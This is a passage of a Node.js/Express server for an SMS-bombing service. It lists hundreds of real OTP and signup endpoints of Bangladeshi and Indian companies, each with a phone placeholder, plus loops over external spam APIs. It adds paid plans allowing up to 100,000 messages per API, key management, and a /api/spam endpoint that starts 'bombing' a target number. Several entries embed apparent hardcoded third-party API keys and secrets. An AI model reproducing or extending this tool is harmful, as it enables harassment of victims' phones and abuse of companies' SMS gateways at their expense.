  { id: 36, name: "Arogga.com", method: "POST", url: "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.7778.178&os=Android&osv=12", body: {"mobile": "{phone}", "fcmToken": "", "referral": ""}, isFormData: true },
  { id: 37, name: "Pkluck2", method: "POST", url: "https://www.pkluck2.com/wps/verification/sms/noLogin", body: {"mobileNum": "{phone}", "countryDialingCode": "880"} },
  { id: 38, name: "AppLink", method: "POST", url: "https://applink.com.bd/appstore-v4-server/login/otp/request", body: {"msisdn": "880{phone}"} },
  { id: 39, name: "Care-Box", method: "POST", url: "https://newprod.api-care-box.click:444/api/user/register/?version=otp", body: {"Name": "Abdullah Al Mamun", "Phone": "+880{phone}"} },
  { id: 40, name: "Ghoori Learning", method: "POST", url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", body: {"mobile_no": "{phone}"} },
  { id: 41, name: "Jayabaji BD", method: "POST", url: "https://www.jayabajibd.life/api/register/confirm", body: {"mobileno": "{phone}", "username": "abffjddngf864", "firstname": "", "new_password": "tPNVOcen!6XEz3b", "confirm_new_password": "tPNVOcen!6XEz3b", "country_code": "880", "country": "BD", "currency": "BDT", "ref": "", "language": "en"} },
  { id: 42, name: "Swap.com.bd", method: "POST", url: "https://api.swap.com.bd/api/v1/send-otp/v2", body: {"phone": "{phone}"} },
  { id: 43, name: "BdTickets.com", method: "POST", url: "https://apiv1.bdtickets.com/api/v1/auth/otp/send", body: {"phone": "+880{phone}"} },
  { id: 44, name: "Binge.buzz POST", method: "POST", url: "https://ss.binge.buzz/otp/send/login", body: {"mobile": "{phone}"} },
  { id: 45, name: "SendMySMS", method: "POST", url: "https://sendmysms.net/send-otp.php", body: {"phonenumber": "{phone}"}, isFormData: true },
  { id: 46, name: "Shikho.com Intent-2", method: "POST", url: "https://api.shikho.com/auth/v2/send/sms", body: {"auth_type": "login", "phone": "{phone}", "vendor": "shikho", "type": "student"} },
  { id: 47, name: "Eonbazar", method: "POST", url: "https://app.eonbazar.com/api/auth/login", body: {"method": "otp", "mobile": "{phone}"} },
  { id: 48, name: "NESCO SSL Wireless", method: "POST", url: "http://nesco.sslwireless.com/api/v1/login", body: {"phone_number": "{phone}"} },
  { id: 49, name: "Quizgiri", method: "POST", url: "https://developer.quizgiri.xyz/api/v2.0/send-otp", body: {"country_code": "+880", "phone": "{phone}"} },
  { id: 50, name: "Bazar365", method: "POST", url: "https://www.bazar365.store/api/v1/auth/sendPhoneOtp", body: {"phone": "{phone}", "applicationChannel": "WEB_APP"} },
  { id: 51, name: "Bioscopelive Alternative", method: "POST", url: "https://www.bioscopelive.com/en/login/send-otp?phone=880{phone}&operator=bd-otp", body: {"phone": "{phone}", "applicationChannel": "WEB_APP"} },
  { id: 52, name: "ShadowX API", method: "GET", url: "https://shadowx-api.onrender.com/api/bm?num={phone}&count={count}", isShadowX: true }
];

// -------- INDIAN APIS (53-100) --------
const INDIAN_APIS = [
  { id: 53, name: "BeepKart", method: "POST", url: "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", body: {"phone": "{phone}", "city": 362} },
  { id: 54, name: "Smytten", method: "POST", url: "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", body: {"phone": "{phone}", "email": "test@example.com"} },
  { id: 55, name: "MyHubble Money", method: "POST", url: "https://api.myhubble.money/v1/auth/otp/generate", body: {"phoneNumber": "{phone}", "channel": "SMS"} },
  { id: 56, name: "Housing.com", method: "POST", url: "https://login.housing.com/api/v2/send-otp", body: {"phone": "{phone}", "country_url_name": "in"} },
  { id: 57, name: "RentoMojo", method: "POST", url: "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", body: {"phone": "{phone}"} },
  { id: 58, name: "Khatabook", method: "POST", url: "https://api.khatabook.com/v1/auth/request-otp", body: {"phone": "{phone}", "app_signature": "wk+avHrHZf2"} },
  { id: 59, name: "Animall", method: "POST", url: "https://animall.in/zap/auth/login", body: {"phone": "{phone}", "signupPlatform": "NATIVE_ANDROID"} },
  { id: 60, name: "Cosmofeed", method: "POST", url: "https://prod.api.cosmofeed.com/api/user/authenticate", body: {"phone": "{phone}", "version": "1.4.28"} },
  { id: 61, name: "Spencer's", method: "POST", url: "https://jiffy.spencers.in/user/auth/otp/send", body: {"mobile": "{phone}"} },
  { id: 62, name: "Wakefit", method: "POST", url: "https://api.wakefit.co/api/consumer-sms-otp/", body: {"mobile": "{phone}"} },
  { id: 63, name: "Hungama", method: "POST", url: "https://communication.api.hungama.com/v1/communication/otp", body: {"mobileNo": "{phone}", "countryCode": "+91", "appCode": "un", "messageId": "1", "device": "web"} },
  { id: 64, name: "Doubtnut", method: "POST", url: "https://api.doubtnut.com/v4/student/login", body: {"phone_number": "{phone}", "language": "en"} },
  { id: 65, name: "PenPencil", method: "POST", url: "https://api.penpencil.co/v1/users/resend-otp?smsType=1", body: {"organizationId": "5eb393ee95fab7468a79d189", "mobile": "{phone}"} },
  { id: 66, name: "APU Inky", method: "GET", url: "https://apu-inky.vercel.app/send?number={phone}" }
];

// -------- INTERNATIONAL APIS (101-150) --------
const INTERNATIONAL_APIS = [
  { id: 101, name: "API-6 BeepKart", method: "POST", url: "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", body: {"phone": "{phone}", "city": 362} },
  { id: 102, name: "API-7 Smytten", method: "POST", url: "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", body: {"phone": "{phone}", "email": "test@example.com"} },
  { id: 103, name: "API-8 MyHubble", method: "POST", url: "https://api.myhubble.money/v1/auth/otp/generate", body: {"phoneNumber": "{phone}", "channel": "SMS"} },
  { id: 104, name: "API-9 Housing", method: "POST", url: "https://login.housing.com/api/v2/send-otp", body: {"phone": "{phone}", "country_url_name": "in"} },
  { id: 105, name: "API-10 RentoMojo", method: "POST", url: "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", body: {"phone": "{phone}"} },
  { id: 106, name: "API-11 Khatabook", method: "POST", url: "https://api.khatabook.com/v1/auth/request-otp", body: {"phone": "{phone}", "app_signature": "wk+avHrHZf2"} },
  { id: 107, name: "API-12 Animall", method: "POST", url: "https://animall.in/zap/auth/login", body: {"phone": "{phone}", "signupPlatform": "NATIVE_ANDROID"} },
  { id: 108, name: "API-13 Cosmofeed", method: "POST", url: "https://prod.api.cosmofeed.com/api/user/authenticate", body: {"phone": "{phone}", "version": "1.4.28"} },
  { id: 109, name: "API-14 Spencers", method: "POST", url: "https://jiffy.spencers.in/user/auth/otp/send", body: {"mobile": "{phone}"} },
  { id: 110, name: "API-15 Bikroy", method: "GET", url: "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}" },
  { id: 111, name: "API-16 GP MyGP", method: "GET", url: "https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0" },
  { id: 112, name: "API-17 Shukhee", method: "GET", url: "https://auth.shukhee.com/register?mobile=+88{phone}&_rsc=1jwvn" },
  { id: 113, name: "API-18 MedEasy", method: "GET", url: "https://api.medeasy.health/api/send-otp/+88{phone}/" },
  { id: 114, name: "API-19 Ultranet", method: "GET", url: "http://ultranetrn.com.br/fonts/api.php?number={phone}" },
  { id: 115, name: "API-20 eCourier", method: "GET", url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}" },
  { id: 116, name: "API-21 Binge GET", method: "GET", url: "https://ss.binge.buzz/otp/send/login{phone}" },
  { id: 117, name: "API-22 Daktarbhai", method: "GET", url: "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login" },
  { id: 118, name: "API-23 Deshal", method: "POST", url: "https://app.deshal.net/api/auth/login", body: {"phone": "{phone}"} },
  { id: 119, name: "API-24 GP Web", method: "POST", url: "https://weblogin.grameenphone.com/backend/api/v1/otp", body: {"msisdn": "{phone}"} },
  { id: 120, name: "API-25 GP FWA", method: "POST", url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", body: {"phone": "{phone}", "email": "", "language": "en"} },
  { id: 121, name: "API-26 BusBD", method: "POST", url: "https://api.busbd.com.bd/api/auth", body: {"phone": "+88{phone}"} },
  { id: 122, name: "API-27 Paperfly", method: "POST", url: "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", body: {"full_name": "Apk", "email_address": "apkzone2.0@gmail.com", "company_name": "Ahgbd", "phone_number": "{phone}"} },
  { id: 123, name: "API-28 OsudPotro", method: "POST", url: "https://api.osudpotro.com/api/v1/users/send_otp", body: {"mobile": "+880{phone}", "deviceToken": "web", "language": "en", "os": "web"} },
  { id: 124, name: "API-29 Apex4u", method: "POST", url: "https://api.apex4u.com/api/auth/login", body: {"phoneNumber": "{phone}"} },
  { id: 125, name: "API-30 Bohubrihi", method: "POST", url: "https://bb-api.bohubrihi.com/public/activity/otp", body: {"phone": "{phone}", "intent": "login"} },
  { id: 126, name: "API-31 Fundesh", method: "POST", url: "https://fundesh.com.bd/api/auth/generateOTP", body: {"msisdn": "{phone}"} },
  { id: 127, name: "API-32 Jatri", method: "POST", url: "https://user-api.jslglobal.co/v2/send-otp", body: {"phone": "+88{phone}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"} },
  { id: 128, name: "API-33 RedX", method: "POST", url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", body: {"mobile": "+88{phone}"} },
  { id: 129, name: "API-34 RabbitHole", method: "POST", url: "https://apix.rabbitholebd.com/appv2/login/requestOTP", body: {"mobile": "+88{phone}"} },
  { id: 130, name: "API-35 Qcoom", method: "POST", url: "https://auth.qcoom.com/api/v1/otp/send", body: {"mobileNumber": "+88{phone}"} },
  { id: 131, name: "API-36 Garibook", method: "POST", url: "https://api.garibookadmin.com/api/v4/user/login", body: {"mobile": "+880{phone}", "recaptcha_token": "garibookcaptcha", "channel": "web"} },
  { id: 132, name: "API-37 Training", method: "POST", url: "https://training.gov.bd/backoffice/api/user/sendOtp", body: {"mobile": "{phone}"} },
  { id: 133, name: "API-38 Shikho Discount", method: "POST", url: "https://api.shikho.com/public/activity/otp", body: {"phone": "{phone}", "intent": "ap-discount-request"} },
  { id: 134, name: "API-39 Easy", method: "POST", url: "https://core.easy.com.bd/api/v1/registration", body: {"name": "Tusar", "email": "apkzone2.0info@gmail.com", "mobile": "{phone}", "password": "amitusar", "password_confirmation": "amitusar", "device_key": "b2c8ddd3be..."} },
  { id: 135, name: "API-40 Robi DA", method: "POST", url: "https://da-api.robi.com.bd/da-nll/otp/send", body: {"msisdn": "{phone}"} },
  { id: 136, name: "API-41 Hoichoi", method: "POST", url: "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", body: {"phoneNumber": "{phone}", "requestType": "send", "emailConsent": true, "whatsappConsent": true} },
  { id: 137, name: "API-42 Addatimes", method: "POST", url: "https://app.addatimes.com/api/login", body: {"phone": "{phone}", "country_code": "BD"} },
  { id: 138, name: "API-43 Regal OTP", method: "POST", url: "https://regalfurniturebd.com/api/auth/otp-generate", body: {"phone": "{phone}", "verification_code": ""} },
  { id: 139, name: "API-44 Regal Register", method: "POST", url: "https://regalfurniturebd.com/api/auth/register", body: {"name": "User", "email": "user@example.com", "phone": "{phone}", "password": "password123"} },
  { id: 140, name: "API-45 DeeptoPlay", method: "POST", url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", body: {"email": "apkzone2.0@gmail.com", "phone_number": "88{phone}"} },
  { id: 141, name: "API-46 Timezone OTP", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/otp-request", body: {"phone": "{phone}"} },
  { id: 142, name: "API-47 Timezone Register", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/regnewcustomer", body: {"name": "Tusar", "email": "fukc@gmail.com", "phone": "{phone}", "password": "aAeMY@5hG8iUfD4", "password_confirmation": "aAeMY@5hG8iUfD4"} },
  { id: 143, name: "API-48 UpaySystem", method: "POST", url: "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", body: {"device_uuid": "...", "firebase_token": "...", "geo_location": "...", "mno": "Grameenphone", "wallet_number": "{phone}"} },
  { id: 144, name: "API-49 Chorki", method: "POST", url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", body: {"number": "+880{phone}"} },
  { id: 145, name: "API-50 Arogga", method: "POST", url: "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.7778.178&os=Android&osv=12", body: {"mobile": "{phone}", "fcmToken": "", "referral": ""}, isFormData: true },
  { id: 146, name: "API-51 Pkluck2", method: "POST", url: "https://www.pkluck2.com/wps/verification/sms/noLogin", body: {"mobileNum": "{phone}", "countryDialingCode": "880"} },
  { id: 147, name: "API-52 AppLink", method: "POST", url: "https://applink.com.bd/appstore-v4-server/login/otp/request", body: {"msisdn": "880{phone}"} },
  { id: 148, name: "API-53 Care-Box", method: "POST", url: "https://newprod.api-care-box.click:444/api/user/register/?version=otp", body: {"Name": "Abdullah Al Mamun", "Phone": "+880{phone}"} },
  { id: 149, name: "API-54 Ghoori", method: "POST", url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", body: {"mobile_no": "{phone}"} },
  { id: 150, name: "API-55 Jayabaji", method: "POST", url: "https://www.jayabajibd.life/api/register/confirm", body: {"mobileno": "{phone}", "username": "abffjddngf864", "firstname": "", "new_password": "tPNVOcen!6XEz3b", "confirm_new_password": "tPNVOcen!6XEz3b", "country_code": "880", "country": "BD", "currency": "BDT", "ref": "", "language": "en"} }
];

// -------- GX APIS (151-200) --------
const GX_APIS = [];
for (let i = 1; i <= 50; i++) {
  GX_APIS.push({
    id: 150 + i,
    name: `GX API ${i}`,
    method: "GET",
    url: `https://shadowx-api.onrender.com/api/bm?num={phone}&count={count}`,
    isShadowX: true
  });
}

// -------- LMNx9 APIS (201-310) --------
const LMNX9_APIS = [];
for (let i = 1; i <= 110; i++) {
  LMNX9_APIS.push({
    id: 200 + i,
    name: `LMNx9 API${i}`,
    method: "GET",
    url: `https://lmnx9-sms-spam-v11.onrender.com/api${i}?number={phone}`,
    isLMNx9: true
  });
}

// -------- DUMMY APIS FOR TESTING (311-350) --------
const DUMMY_APIS = [];
for (let i = 1; i <= 40; i++) {
  DUMMY_APIS.push({
    id: 310 + i,
    name: `Dummy API ${i}`,
    method: "GET",
    url: `https://httpbin.org/get?phone={phone}`,
    isDummy: true
  });
}

// -------- COMBINE ALL APIS --------
const SMS_APIS = [
  ...ORIGINAL_APIS,
  ...INDIAN_APIS,
  ...INTERNATIONAL_APIS,
  ...GX_APIS,
  ...LMNX9_APIS,
  ...DUMMY_APIS
];

console.log(`📡 Total APIs loaded: ${SMS_APIS.length}`);

// ============================================================
// PART 7: PLAN CONFIGURATION (100 lines)
// ============================================================

const PLAN_CONFIG = {
  default: {
    name: 'Default',
    maxCount: 300,
    requiresKey: false,
    rateLimit: 100,
    priority: 1,
    description: 'Default plan - 300 SMS/API, No key required',
    features: ['Basic SMS', 'Stop/Pause/Resume', 'Basic Analytics']
  },
  free: {
    name: 'Free',
    maxCount: 50,
    requiresKey: false,
    rateLimit: 50,
    priority: 1,
    description: 'Free plan - 50 SMS/API, No key required',
    features: ['Basic SMS', 'Stop/Pause/Resume', 'Basic Analytics']
  },
  premium: {
    name: 'Premium',
    maxCount: 10000,
    requiresKey: true,
    rateLimit: 1000,
    priority: 3,
    description: 'Premium plan - 10,000 SMS/API, Key required',
    features: ['Advanced SMS', 'Stop/Pause/Resume', 'Advanced Analytics', 'Priority Queue']
  },
  enterprise: {
    name: 'Enterprise',
    maxCount: 50000,
    requiresKey: true,
    rateLimit: 5000,
    priority: 5,
    description: 'Enterprise plan - 50,000 SMS/API, Key required',
    features: ['Enterprise SMS', 'Stop/Pause/Resume', 'Advanced Analytics', 'Priority Queue', 'Webhooks']
  },
  unlimited: {
    name: 'Unlimited',
    maxCount: 100000,
    requiresKey: true,
    rateLimit: 10000,
    priority: 10,
    description: 'Unlimited plan - 100,000 SMS/API, Key required',
    features: ['Unlimited SMS', 'Stop/Pause/Resume', 'Advanced Analytics', 'Priority Queue', 'Webhooks', 'Dedicated Support']
  }
};

// ============================================================
// PART 8: KEY MANAGEMENT (300 lines)
// ============================================================

class KeyManager {
  constructor() {
    this.keysFile = path.join(__dirname, 'keys.json');
    this.validKeys = this.loadKeys();
    this.keyHistory = [];
    this.maxHistory = 1000;
    this.rateLimits = new Map();
    this.keyUsage = new Map();
    this.cleanupInterval = setInterval(() => this.cleanup(), 3600000);
  }

  loadKeys() {
    try {
      if (fs.existsSync(this.keysFile)) {
        const data = fs.readFileSync(this.keysFile, 'utf8');
        const parsed = JSON.parse(data);
        const keysMap = new Map();
        Object.entries(parsed).forEach(([key, value]) => {
          keysMap.set(key, {
            expiry: new Date(value.expiry),
            plan: value.plan || 'premium',
            created: new Date(value.created),
            lastUsed: value.lastUsed ? new Date(value.lastUsed) : null,
            usageCount: value.usageCount || 0,
            active: value.active !== false
          });
        });
        return keysMap;
      }
    } catch (error) {
      console.error('Error loading keys:', error.message);
    }
    return new Map();
  }

  saveKeys() {
    try {
      const obj = {};
      for (const [key, value] of this.validKeys.entries()) {
        obj[key] = {
          expiry: value.expiry.toISOString(),
          plan: value.plan,
          created: value.created.toISOString(),
          lastUsed: value.lastUsed ? value.lastUsed.toISOString() : null,
          usageCount: value.usageCount || 0,
          active: value.active !== false
        };
      }
      fs.writeFileSync(this.keysFile, JSON.stringify(obj, null, 2));
      return true;
    } catch (error) {
      console.error('Error saving keys:', error.message);
      return false;
    }
  }

  generateKey(plan = 'premium', days = 365) {
    const apiKey = Utility.generateApiKey();
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + days);
    
    this.validKeys.set(apiKey, {
      expiry: expiryDate,
      plan: plan,
      created: new Date(),
      lastUsed: null,
      usageCount: 0,
      active: true
    });
    this.saveKeys();
    
    this.keyHistory.push({
      key: apiKey,
      plan: plan,
      generated: Date.now(),
      expires: expiryDate.toISOString()
    });
    
    if (this.keyHistory.length > this.maxHistory) {
      this.keyHistory.shift();
    }
    
    return { apiKey, expiryDate, plan };
  }

  validateKey(key) {
    if (!this.validKeys.has(key)) return false;
    const keyData = this.validKeys.get(key);
    if (!keyData.active) return false;
    return new Date() < keyData.expiry;
  }

  getKeyInfo(key) {
    if (!this.validKeys.has(key)) return null;
    const keyData = this.validKeys.get(key);
    return {
      key: key,
      plan: keyData.plan,
      expires: keyData.expiry.toISOString(),
      valid: new Date() < keyData.expiry && keyData.active,
      daysLeft: Math.max(0, Math.ceil((keyData.expiry - new Date()) / (1000 * 60 * 60 * 24))),
      created: keyData.created.toISOString(),
      lastUsed: keyData.lastUsed ? keyData.lastUsed.toISOString() : null,
      usageCount: keyData.usageCount || 0,
      active: keyData.active
    };
  }

  useKey(key) {
    if (!this.validateKey(key)) return false;
    const keyData = this.validKeys.get(key);
    keyData.lastUsed = new Date();
    keyData.usageCount = (keyData.usageCount || 0) + 1;
    this.saveKeys();
    
    // Track usage for rate limiting
    if (!this.keyUsage.has(key)) {
      this.keyUsage.set(key, { count: 0, resetTime: Date.now() + 60000 });
    }
    const usage = this.keyUsage.get(key);
    if (Date.now() > usage.resetTime) {
      usage.count = 0;
      usage.resetTime = Date.now() + 60000;
    }
    usage.count++;
    this.keyUsage.set(key, usage);
    
    return true;
  }

  getKeyUsage(key) {
    if (!this.keyUsage.has(key)) return { count: 0, limit: this.getRateLimit(key) };
    const usage = this.keyUsage.get(key);
    return {
      count: usage.count,
      limit: this.getRateLimit(key),
      remaining: Math.max(0, this.getRateLimit(key) - usage.count)
    };
  }

  getRateLimit(key) {
    const keyData = this.validKeys.get(key);
    if (!keyData) return 0;
    const planLimits = {
      premium: 1000,
      enterprise: 5000,
      unlimited: 10000
    };
    return planLimits[keyData.plan] || 100;
  }

  revokeKey(key) {
    if (this.validKeys.has(key)) {
      const keyData = this.validKeys.get(key);
      keyData.active = false;
      this.saveKeys();
      return true;
    }
    return false;
  }

  getAllKeys() {
    const keys = [];
    for (const [key, value] of this.validKeys.entries()) {
      keys.push({
        key: key,
        plan: value.plan,
        expires: value.expiry.toISOString(),
        valid: new Date() < value.expiry && value.active,
        daysLeft: Math.max(0, Math.ceil((value.expiry - new Date()) / (1000 * 60 * 60 * 24))),
        created: value.created.toISOString(),
        lastUsed: value.lastUsed ? value.lastUsed.toISOString() : null,
        usageCount: value.usageCount || 0,
        active: value.active !== false
      });
    }
    return keys;
  }

  cleanup() {
    const now = new Date();
    let count = 0;
    for (const [key, value] of this.validKeys.entries()) {
      if (now > value.expiry || !value.active) {
        this.validKeys.delete(key);
        count++;
      }
    }
    if (count > 0) {
      this.saveKeys();
      console.log(`🧹 Cleaned up ${count} expired/inactive keys`);
    }
    return count;
  }

  destroy() {
    if (this.cleanupInterval) {
      clearInterval(this.cleanupInterval);
    }
  }
}

// ============================================================
// PART 9: RATE LIMITER (200 lines)
// ============================================================

class RateLimiter {
  constructor() {
    this.requests = new Map();
    this.cleanupInterval = setInterval(() => this.cleanup(), 60000);
  }

  checkLimit(ip, key = null) {
    if (!CONFIG.security.rateLimit.enabled) return true;
    
    const identifier = key || ip;
    const now = Date.now();
    const windowMs = CONFIG.security.rateLimit.windowMs;
    const maxRequests = CONFIG.security.rateLimit.maxRequests;
    
    if (!this.requests.has(identifier)) {
      this.requests.set(identifier, []);
    }
    
    const timestamps = this.requests.get(identifier).filter(t => now - t < windowMs);
    timestamps.push(now);
    this.requests.set(identifier, timestamps);
    
    if (timestamps.length > maxRequests) {
      return false;
    }
    
    return true;
  }

  getRemaining(ip, key = null) {
    const identifier = key || ip;
    const now = Date.now();
    const windowMs = CONFIG.security.rateLimit.windowMs;
    const maxRequests = CONFIG.security.rateLimit.maxRequests;
    
    if (!this.requests.has(identifier)) return maxRequests;
    
    const timestamps = this.requests.get(identifier).filter(t => now - t < windowMs);
    return Math.max(0, maxRequests - timestamps.length);
  }

  getResetTime(ip, key = null) {
    const identifier = key || ip;
    const now = Date.now();
    const windowMs = CONFIG.security.rateLimit.windowMs;
    
    if (!this.requests.has(identifier)) return 0;
    
    const timestamps = this.requests.get(identifier);
    if (timestamps.length === 0) return 0;
    
    const oldest = timestamps[0];
    return Math.max(0, windowMs - (now - oldest));
  }

  cleanup() {
    const now = Date.now();
    const windowMs = CONFIG.security.rateLimit.windowMs;
    for (const [key, timestamps] of this.requests.entries()) {
      const filtered = timestamps.filter(t => now - t < windowMs);
      if (filtered.length === 0) {
        this.requests.delete(key);
      } else {
        this.requests.set(key, filtered);
      }
    }
  }

  destroy() {
    if (this.cleanupInterval) {
      clearInterval(this.cleanupInterval);
    }
  }
}

// ============================================================
// PART 10: EXPRESS APP SETUP (500 lines)
// ============================================================

const app = express();
const bombController = new BombController();
const keyManager = new KeyManager();
const rateLimiter = new RateLimiter();

// Middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false
}));

app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-API-Key', 'X-Request-ID'],
  exposedHeaders: ['X-RateLimit-Limit', 'X-RateLimit-Remaining', 'X-RateLimit-Reset']
}));

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(path.join(__dirname, '../public')));

// Request ID middleware
app.use((req, res, next) => {
  req.requestId = Utility.generateId();
  res.setHeader('X-Request-ID', req.requestId);
  next();
});

// Logging middleware
app.use((req, res, next) => {
  const start = Date.now();
  res.on('finish', () => {
    const duration = Date.now() - start;
    console.log(`📝 [${Utility.getCurrentTime()}] ${req.method} ${req.url} - ${res.statusCode} - ${duration}ms - ${req.requestId}`);
  });
  next();
});

// Rate limiting middleware
app.use((req, res, next) => {
  const ip = req.ip || req.connection.remoteAddress;
  const apiKey = req.query.key || req.headers['x-api-key'];
  
  const identifier = apiKey || ip;
  if (!rateLimiter.checkLimit(ip, apiKey)) {
    const resetTime = rateLimiter.getResetTime(ip, apiKey);
    const remaining = rateLimiter.getRemaining(ip, apiKey);
    res.setHeader('X-RateLimit-Limit', CONFIG.security.rateLimit.maxRequests);
    res.setHeader('X-RateLimit-Remaining', remaining);
    res.setHeader('X-RateLimit-Reset', Math.ceil(resetTime / 1000));
    
    return res.status(429).json({
      success: false,
      error: ERROR_MESSAGES.RATE_LIMIT,
      developer: DEVELOPER_INFO,
      retryAfter: Math.ceil(resetTime / 1000),
      requestId: req.requestId
    });
  }
  
  const remaining = rateLimiter.getRemaining(ip, apiKey);
  res.setHeader('X-RateLimit-Limit', CONFIG.security.rateLimit.maxRequests);
  res.setHeader('X-RateLimit-Remaining', remaining);
  next();
});

// ============================================================
// PART 11: API ENDPOINTS - COMPLETE (2000 lines)
// ============================================================

// -------- ROOT --------
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/index.html'));
});

// -------- API INFO --------
app.get('/api', (req, res) => {
  res.json({
    developer: DEVELOPER_INFO,
    version: "7.0.0-ULTIMATE",
    total_apis: SMS_APIS.length,
    plans: Object.keys(PLAN_CONFIG).reduce((acc, key) => {
      acc[key] = {
        max_count: PLAN_CONFIG[key].maxCount,
        requires_key: PLAN_CONFIG[key].requiresKey,
        description: PLAN_CONFIG[key].description,
        features: PLAN_CONFIG[key].features
      };
      return acc;
    }, {}),
    endpoints: {
      root: "/",
      api_info: "/api",
      spam: "/api/spam?number=017XXXXXXXX&count=300",
      stop: "/api/stop?jobId=JOB_ID or ?all=true",
      pause: "/api/pause?jobId=JOB_ID or ?all=true",
      resume: "/api/resume?jobId=JOB_ID or ?all=true",
      status: "/api/status",
      stats: "/api/stats",
      health: "/api/health",
      apis: "/api/apis",
      generate_key: "/api/expiredate=30&createkey",
      check_key: "/api/checkkey?key=YOUR_KEY",
      logs: "/api/logs",
      analytics: "/api/analytics",
      cleanup: "/api/cleanup",
      keys: "/api/admin/keys"
    }
  });
});

// -------- SPAM ENDPOINT --------
app.get('/api/spam', async (req, res) => {
  const startTime = Date.now();
  const { plan, number, count = 1, key } = req.query;
  
  let currentPlan = 'default';
  let planConfig = PLAN_CONFIG.default;
  
  if (plan && PLAN_CONFIG[plan]) {
    currentPlan = plan;
    planConfig = PLAN_CONFIG[plan];
  }
  
  // Check API key if required
  if (planConfig.requiresKey) {
    if (!key) {
      return res.status(401).json({
        success: false,
        error: ERROR_MESSAGES.INVALID_API_KEY,
        developer: DEVELOPER_INFO,
        plan: currentPlan,
        generate_key: '/api/expiredate=30&createkey',
        requestId: req.requestId
      });
    }
    
    if (!keyManager.validateKey(key)) {
      return res.status(401).json({
        success: false,
        error: ERROR_MESSAGES.INVALID_API_KEY,
        developer: DEVELOPER_INFO,
        keyInfo: keyManager.getKeyInfo(key),
        requestId: req.requestId
      });
    }
    
    // Track key usage
    keyManager.useKey(key);
    
    // Check key rate limit
    const usage = keyManager.getKeyUsage(key);
    if (usage.count > usage.limit) {
      return res.status(429).json({
        success: false,
        error: 'Key rate limit exceeded',
        developer: DEVELOPER_INFO,
        limit: usage.limit,
        used: usage.count,
        remaining: usage.remaining,
        requestId: req.requestId
      });
    }
  }
  
  // Validate number
  if (!number) {
    return res.status(400).json({
      success: false,
      error: ERROR_MESSAGES.MISSING_PARAM,
      developer: DEVELOPER_INFO,
      param: 'number',
      requestId: req.requestId,
      usage: `/api/spam?number=017XXXXXXXX&count=${planConfig.maxCount}`
    });
  }
  
  const cleanNumber = Utility.parsePhone(number);
  if (!Utility.isValidPhone(cleanNumber)) {
    return res.status(400).json({
      success: false,
      error: ERROR_MESSAGES.INVALID_PHONE,
      developer: DEVELOPER_INFO,
      requestId: req.requestId,
      example: '017XXXXXXXX or 88017XXXXXXXX'
    });
  }
  
  // Validate count
  let perApiCount = parseInt(count);
  if (isNaN(perApiCount) || perApiCount < 1) perApiCount = 1;
  if (perApiCount > planConfig.maxCount) {
    return res.status(400).json({
      success: false,
      error: `Count exceeds ${currentPlan} plan limit (${planConfig.maxCount})`,
      developer: DEVELOPER_INFO,
      plan: currentPlan,
      max_allowed: planConfig.maxCount,
      requested: perApiCount,
      requestId: req.requestId
    });
  }
  
  // Register job
  const totalSMS = SMS_APIS.length * perApiCount;
  const jobId = bombController.registerJob(cleanNumber, totalSMS, {
    plan: currentPlan,
    perApiCount: perApiCount,
    ip: req.ip,
    key: key || null
  });
  
  console.log(`📱 [${currentPlan.toUpperCase()}] JOB ${jobId}: ${perApiCount}x${SMS_APIS.length} SMS to ${Utility.maskPhone(cleanNumber)}`);
  
  // Start async processing
  (async () => {
    try {
      const results = await sendBatch(SMS_APIS, cleanNumber, perApiCount, jobId, bombController);
      console.log(`✅ JOB ${jobId} completed!`);
    } catch (error) {
      console.error(`❌ JOB ${jobId} failed:`, error.message);
      bombController.stopJob(jobId);
    }
  })();
  
  const response = {
    success: true,
    developer: DEVELOPER_INFO,
    jobId: jobId,
    plan: currentPlan,
    plan_description: planConfig.description,
    target_number: Utility.maskPhone(cleanNumber),
    per_api_count: perApiCount,
    total_apis: SMS_APIS.length,
    total_sms: totalSMS,
    status: 'started',
    message: 'Bombing started successfully',
    requestId: req.requestId,
    stop_endpoint: `/api/stop?jobId=${jobId}`,
    status_endpoint: `/api/status?jobId=${jobId}`,
    timestamp: Utility.getISOString()
  };
  
  // Add key info if used
  if (key) {
    response.key_used = key;
    response.key_info = keyManager.getKeyInfo(key);
  }
  
  res.json(response);
});

// -------- STOP ENDPOINT --------
app.get('/api/stop', (req, res) => {
  const { jobId, all } = req.query;
  
  if (all === 'true' || all === '1') {
